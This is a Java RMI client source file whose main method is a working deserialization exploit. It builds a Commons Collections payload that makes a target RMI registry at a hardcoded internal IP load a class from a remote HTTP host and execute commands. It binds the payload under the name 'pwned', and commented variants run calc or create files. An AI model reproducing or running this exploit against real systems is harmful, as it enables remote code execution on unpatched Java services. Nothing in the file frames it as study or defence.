package rmi.client;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import payload.PayloadGeneration;

import rmi.model.PersonEntity;
import rmi.service.PersonServiceInterface;

public class Client {
	
	public static void main_orignal(String[] args)
	{
		try{
			//调用远程对象，注意RMI路径与接口必须与服务器配置一致
			PersonServiceInterface personService=(PersonServiceInterface)Naming.lookup("rmi://127.0.0.1:6600/PersonService");
			List<PersonEntity> personList=personService.GetList();
			for(PersonEntity person:personList){
				System.out.println("ID:"+person.getId()+" Age:"+person.getAge()+" Name:"+person.getName());
			}
		}catch(Exception ex){
			ex.printStackTrace();
		}
	}
	
	public static void main(String[] args) {
		
		//String ip = args[0];
		//int port = Integer.parseInt(args[1]);
		
		String ip = "10.10.10.135";
		int port = 1090 ; 
		
		try{
			
				
				//Object instance = PayloadGeneration.generateExecPayload("calc");
				Object instance = PayloadGeneration.generateURLClassLoaderPayload("http://121.42.175.111:8080/java/", "exploit.ErrorBaseExec", "do_exec", "pwd"); 
				
				//Object instance = PayloadGeneration.generateLazyMapExecPayload("touch /home/angelwhu/tmp/pwned");	
				//Object instance = PayloadGeneration.generateLazyMapURLClassLoaderPayload("http://121.42.175.111:8080/java/", "exploit.ErrorBaseExec", "do_exec", "calc");
				
				InvocationHandler h = (InvocationHandler) instance;
				Remote r = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[]{Remote.class},h));
				Registry registry = LocateRegistry.getRegistry(ip, port);
				try{
					registry.bind("pwned", r); // r is remote obj
				}
				catch (Throwable e) 
				{
					e.printStackTrace();
				}
				
				
//				try {
//					String[] names = registry.list();
//					for (String name : names) {
//						System.out.println("looking up '" + name + "'");
//						try {
//							Remote rem = registry.lookup(name);
//							System.out.println(Arrays.asList(rem.getClass().getInterfaces()));
//						} catch (Throwable e) {
//							e.printStackTrace();
//						}					
//					}
//				} catch (Throwable e) {
//					e.printStackTrace();
//				}
				
				
		}catch (Throwable e) {
			e.printStackTrace();
		}
	}

}
